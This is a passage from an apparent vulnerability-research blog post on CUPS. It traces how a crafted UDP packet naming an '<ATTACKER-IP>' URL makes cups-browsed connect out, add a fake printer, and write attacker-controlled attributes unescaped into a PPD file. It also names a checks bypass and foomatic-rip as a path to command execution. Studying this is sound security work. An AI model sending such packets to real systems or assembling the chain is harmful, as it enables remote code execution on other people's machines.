(p-\u0026gt;prattrs == \u003cspan class=\"literal\"\u003eNULL\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    {\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        debug_printf(\u003cspan class=\"string\"\u003e\u0026#34;get-printer-attributes IPP call failed on printer %s (%s).\\n\u0026#34;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            p-\u0026gt;queue_name, p-\u0026gt;uri);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        \u003cspan class=\"keyword\"\u003egoto\u003c/span\u003e fail;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eTo understand what this means, we’ll need to briefly mention what the IPP protocol is, but for now the key points are:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA packet containing any URL, in the form of \u003ccode\u003e0 3 http://\u0026lt;ATTACKER-IP\u0026gt;:\u0026lt;PORT\u0026gt;/printers/whatever\u003c/code\u003e, gets to UDP port 631\u003c/li\u003e\n\u003cli\u003eThis triggers a sequence of events that result in cups-browsed connecting to that URL, a drive-by kind of thing.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eSo I tell to myself: \u003cem\u003ethere’s no freaking way that if I send this packet to a public IP running CUPS (thank you shodan.io), that computer will connect back to the server I specified. No way.\u003c/em\u003e \u003c/p\u003e\n\u003cp\u003eI hack some python code together, fire up a VPS and try anyway.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/passive_info.png\" alt=\"leak\"/\u003e\u003c/p\u003e\n\u003cp\u003eHOLY SH!!!!! Not only it connected back immediately, but it also reported the exact kernel version and architecture in the User-Agent header! We’ll see later how this protocol also reports the requesting username (on the target) for some requests. Also this aspect, that to me \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://cwe.mitre.org/data/definitions/200.html\"\u003ematches pretty well with CWE-200\u003c/a\u003e, has been reported and just scoffed off as  part of the mechanism. Alright … let’s not waste time on arguing whether or not this is a problem, let’s get to the juicy stuff. We know that this thing talks HTTP and POSTs some semi binary payload, what the hell is that?\u003c/p\u003e\n\u003ch2 id=\"Internet-Printing-Protocol\"\u003e\u003ca href=\"#Internet-Printing-Protocol\" class=\"headerlink\" title=\"Internet Printing Protocol\"\u003e\u003c/a\u003eInternet Printing Protocol\u003c/h2\u003e\u003cp\u003eThe \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://en.wikipedia.org/wiki/Internet_Printing_Protocol\"\u003eInternet Printing Protocol\u003c/a\u003e, in short IPP, \u003cem\u003eis a specialized communication protocol for communication between client devices (computers, mobile phones, tablets, etc.) and printers (or print servers). It allows clients to submit one or more print jobs to the network-attached printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or cancelling individual print jobs.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eEssentially, the system now believes that we are a printer and it is sending us, encapsulated in HTTP, a \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://ftp.pwg.org/pub/pwg/ipp/registrations/reg-ippgupa-20171214.pdf\"\u003eGet-Printer-Attributes\u003c/a\u003e request in order to fetch printer attributes such as the model, vendor and several others. It makes sense, the system discovered a new printer and somehow it has to know what it is. Well …\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/im_your_printer.jpg\" alt=\"i\u0026#39;m your printer now\"/\u003e\u003c/p\u003e\n\u003cp\u003eI went back to writing some code and, by using the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/h2g2bob/ipp-server\"\u003eippserver python package\u003c/a\u003e I was now able to respond properly, with attributes I controlled, to the service request. My fake printer was immediately added to the local printers with no notification whatsoever to the user.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/god.jpg\" alt=\"omg\"/\u003e\u003c/p\u003e\n\u003cp\u003eAMAZING! 🎉🥳🎉\u003c/p\u003e\n\u003cp\u003eWhat can we do with this? At this point I enabled debug logs in the service so I could observe what was going on when my fake printer was being discovered and added, and noticed these lines:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 Creating permanent CUPS queue God_192_168_50_19.\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 Loading saved printer options for God_192_168_50_19 from /var/cache/cups-browsed/cups-browsed-options-God_192_168_50_19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 Failed reading file /var/cache/cups-browsed/cups-browsed-options-God_192_168_50_19, probably no options recorded yet\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 Print queue God_192_168_50_19 is for remote CUPS queue(s) and we get notifications from CUPS, using implicit class device URI implicitclass://God_192_168_50_19/\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 PPD generation successful: PDF PPD generated.\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 Created temporary PPD file: /tmp/00f9466d902dc\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 Using PPD /tmp/00f9466d902dc for queue God_192_168_50_19.\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 Editing PPD file /tmp/00f9466d902dc for printer God_192_168_50_19, setting the option defaults of the previous cups-browsed session and doing client-side filtering of the job, saving the resulting PPD in /tmp/00f9466d9231e.\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eWed Sep  4 13:15:32 2024 127517144909504 Non-raw queue God_192_168_50_19 with PPD file: /tmp/00f9466d9231e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e...\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eWait what?! It looks like the service fetches these attributes and then creates some sort of temporary file, a “PPD”, on which these attributes are possibly saved.\u003c/p\u003e\n\u003cp\u003eIf we search for the \u003ccode\u003ePPD generation successful\u003c/code\u003e string that appears in the logs, we find ourselves in the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L8622-L8650\"\u003ecreate_queue function\u003c/a\u003e, where we can see how the attributes are passed to the \u003ccode\u003eppdCreatePPDFromIPP2\u003c/code\u003e API in \u003ccode\u003elibppd\u003c/code\u003e:\u003c/p\u003e\n\u003cfigure class=\"highlight c\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e28\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e29\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// If we do not want CUPS-generated PPDs or we cannot obtain a\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// CUPS-generated PPD, for example if CUPS does not create a\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// temporary queue for this printer, we generate a PPD by\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e// ourselves\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eprinter_ipp_response = (num_cluster_printers == \u003cspan class=\"number\"\u003e1\u003c/span\u003e) ? p-\u0026gt;prattrs :\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eprinter_attributes;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (!ppdCreatePPDFromIPP2(ppdname, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(ppdname), printer_ipp_response,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        make_model,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        pdl, color, duplex, conflicts, sizes,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        default_pagesize, default_color,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        ppdgenerator_msg, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(ppdgenerator_msg)))\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (errno != \u003cspan class=\"number\"\u003e0\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        debug_printf(\u003cspan class=\"string\"\u003e\u0026#34;Unable to create PPD file: %s\\n\u0026#34;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            strerror(errno));\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e        debug_printf(\u003cspan class=\"string\"\u003e\u0026#34;Unable to create PPD file: %s\\n\u0026#34;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e            ppdgenerator_msg);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    p-\u0026gt;status = STATUS_DISAPPEARED;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    current_time = time(\u003cspan class=\"literal\"\u003eNULL\u003c/span\u003e);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    p-\u0026gt;timeout = current_time + TIMEOUT_IMMEDIATELY;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    \u003cspan class=\"keyword\"\u003egoto\u003c/span\u003e end;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e{\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    debug_printf(\u003cspan class=\"string\"\u003e\u0026#34;PPD generation successful: %s\\n\u0026#34;\u003c/span\u003e, ppdgenerator_msg);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    debug_printf(\u003cspan class=\"string\"\u003e\u0026#34;Created temporary PPD file: %s\\n\u0026#34;\u003c/span\u003e, ppdname);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    ppdfile = strdup(ppdname);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e}\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eWe finally get to libppd, where the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/libppd/blob/0d90320157135b9ec585617e1545793b274c7f82/ppd/ppd-generator.c#L182\"\u003eppdCreatePPDFromIPP2 API\u003c/a\u003e is used to \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/libppd/blob/0d90320157135b9ec585617e1545793b274c7f82/ppd/ppd-generator.c#L353\"\u003esave some of those attacker controlled text attributes\u003c/a\u003e to a file with a very specific, line oriented syntax, without any sanitization whatsoever:\u003c/p\u003e\n\u003cfigure class=\"highlight c\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"keyword\"\u003eif\u003c/span\u003e ((attr = ippFindAttribute(supported, \u003cspan class=\"string\"\u003e\u0026#34;printer-make-and-model\u0026#34;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t\t       IPP_TAG_TEXT)) != \u003cspan class=\"literal\"\u003eNULL\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    strlcpy(make, ippGetString(attr, \u003cspan class=\"number\"\u003e0\u003c/span\u003e, \u003cspan class=\"literal\"\u003eNULL\u003c/span\u003e), \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(make));\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  \u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (make_model \u0026amp;\u0026amp; make_model[\u003cspan class=\"number\"\u003e0\u003c/span\u003e] != \u003cspan class=\"string\"\u003e\u0026#39;\\0\u0026#39;\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    strlcpy(make, make_model, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(make));\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  \u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    strlcpy(make, \u003cspan class=\"string\"\u003e\u0026#34;Unknown Printer\u0026#34;\u003c/span\u003e, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(make));\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e (!strncasecmp(make, \u003cspan class=\"string\"\u003e\u0026#34;Hewlett Packard \u0026#34;\u003c/span\u003e, \u003cspan class=\"number\"\u003e16\u003c/span\u003e) ||\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e      !strncasecmp(make, \u003cspan class=\"string\"\u003e\u0026#34;Hewlett-Packard \u0026#34;\u003c/span\u003e, \u003cspan class=\"number\"\u003e16\u003c/span\u003e))\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  {\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    model = make + \u003cspan class=\"number\"\u003e16\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    strlcpy(make, \u003cspan class=\"string\"\u003e\u0026#34;HP\u0026#34;\u003c/span\u003e, \u003cspan class=\"keyword\"\u003esizeof\u003c/span\u003e(make));\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  }\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  \u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"keyword\"\u003eif\u003c/span\u003e ((model = \u003cspan class=\"built_in\"\u003estrchr\u003c/span\u003e(make, \u003cspan class=\"string\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e)) != \u003cspan class=\"literal\"\u003eNULL\u003c/span\u003e)\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    *model++ = \u003cspan class=\"string\"\u003e\u0026#39;\\0\u0026#39;\u003c/span\u003e;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  \u003cspan class=\"keyword\"\u003eelse\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e    model = make;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  cupsFilePrintf(fp, \u003cspan class=\"string\"\u003e\u0026#34;*Manufacturer: \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;\u003c/span\u003e, make);             \u003cspan class=\"comment\"\u003e// \u0026lt;--- LOL\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  cupsFilePrintf(fp, \u003cspan class=\"string\"\u003e\u0026#34;*ModelName: \\\u0026#34;%s %s\\\u0026#34;\\n\u0026#34;\u003c/span\u003e, make, model);      \u003cspan class=\"comment\"\u003e// \u0026lt;--- LOL\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  cupsFilePrintf(fp, \u003cspan class=\"string\"\u003e\u0026#34;*Product: \\\u0026#34;(%s %s)\\\u0026#34;\\n\u0026#34;\u003c/span\u003e, make, model);      \u003cspan class=\"comment\"\u003e// \u0026lt;--- LOL\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  cupsFilePrintf(fp, \u003cspan class=\"string\"\u003e\u0026#34;*NickName: \\\u0026#34;%s %s, %sdriverless, %s\\\u0026#34;\\n\u0026#34;\u003c/span\u003e,\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\t\t make, model, (is_fax ? \u003cspan class=\"string\"\u003e\u0026#34;Fax, \u0026#34;\u003c/span\u003e : \u003cspan class=\"string\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e), VERSION);\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e  cupsFilePrintf(fp, \u003cspan class=\"string\"\u003e\u0026#34;*ShortNickName: \\\u0026#34;%s %s\\\u0026#34;\\n\u0026#34;\u003c/span\u003e, make, model);  \u003cspan class=\"comment\"\u003e// \u0026lt;--- LOL\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eNotice how many attributes are fprintf’ed, unescaped, into the file. The \u003ccode\u003eprinter-make-and-model\u003c/code\u003e is just \u003cstrong\u003eone\u003c/strong\u003e of them. So, \u003cstrong\u003ewhat the hell is a PPD file now?\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eNOTE: These two API are also used in other parts of the overall CUPS system, not just the discovery. IYKWIM.\u003c/p\u003e\n\u003ch2 id=\"PostScript-Printer-Description\"\u003e\u003ca href=\"#PostScript-Printer-Description\" class=\"headerlink\" title=\"PostScript Printer Description\"\u003e\u003c/a\u003ePostScript Printer Description\u003c/h2\u003e\u003cp\u003e\u003ca target=\"_blank\" rel=\"noopener\" href=\"https://en.wikipedia.org/wiki/PostScript_Printer_Description\"\u003ePostScript Printer Description (PPD)\u003c/a\u003e files \u003cem\u003eare created by vendors to describe the entire set of features and capabilities available for their PostScript printers.\u003c/em\u003e\u003cbr/\u003e\u003cem\u003eA PPD also contains the PostScript code (commands) used to invoke features for the print job. As such, PPDs function as drivers for all PostScript printers, by providing a unified interface for the printer’s capabilities and features.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eSo a PPD file is a text file provided by a vendor that describes in a domain specific language the printer capabilities to CUPS and instructs it on how to use it properly. It looks something like this:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e*% =================================\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e*% Basic Device Capabilities\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e*% =================================\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e*LanguageLevel: \u0026#34;2\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e*ColorDevice: True\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e*DefaultColorSpace: CMYK\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e*TTRasterizer: Type42\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e*FileSystem: False\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e*Throughput: \u0026#34;10\u0026#34;\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\n\u003cp\u003eAnd there are \u003cstrong\u003etons\u003c/strong\u003e of different instructions that are supported and can be used to do all sorts of things. I spent a few hours \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://web.mit.edu/PostScript/Adobe/Documents/5003.PPD_Spec_v4.3.pdf\"\u003ejust reading the PPD specs\u003c/a\u003e (thank you MIT), and studying the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://www.cups.org/doc/spec-ppd.html\"\u003eCUPS specific extensions\u003c/a\u003e in order to find something I could rely to perform an attack. And then I found about the \u003ccode\u003ecupsFilter2\u003c/code\u003e directive:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2024/cups1/cupsfilter2.png\" alt=\"cupsFilter2\"/\u003e\u003c/p\u003e\n\u003cp\u003eA filter is any executable contained in the \u003ccode\u003e/usr/lib/cups/filter\u003c/code\u003e path (CUPS \u003cem\u003edoes\u003c/em\u003e check this, you can’t specify \u003cem\u003eany\u003c/em\u003e binary), which will get executed when a print job is sent to the printer, in order to perform some document conversion if the printer doesn’t support that specific format. So, given that we have a constraint on which binary we can execute, we need to find a way to leverage one of the existing filters to run arbitrary commands. And also bypass \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L8939\"\u003ethese checks here\u003c/a\u003e, which only takes a space before the colon.\u003c/p\u003e\n\u003ch2 id=\"The-problematic-child-foomatic-rip\"\u003e\u003ca href=\"#The-problematic-child-foomatic-rip\" class=\"headerlink\" title=\"The problematic child: foomatic-rip\"\u003e\u003c/a\u003eThe problematic child: foomatic-rip\u003c/h2\u003e\u003cp\u003eAnother search revealed pretty quickly what could be defined as the \u003cem\u003enecessary evil\u003c/em\u003e of the CUPS family, the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://linux.die.net/man/1/foomatic-rip\"\u003efoomatic-rip filter\u003c/a\u003e. This executable has a long history of being leveraged for exploitation, starting from the first known (to me at least) \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-2964\"\u003eCVE-2011-2964\u003c/a\u003e and \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://nvd.nist.gov/vuln/detail/CVE-2011-2697\"\u003eCVE-2011-2697\u003c/a\u003e back in 2011. The filter accepted the \u003ccode\u003eFoomaticRIPCommandLine\u003c/code\u003e directive in the PPD that would allow ANY command to be executed through it. Nice!\u003c/p\u003e\n\u003cp\u003eAccording to the records, \u003ca target=\"_blank\" rel=\"noopener\" 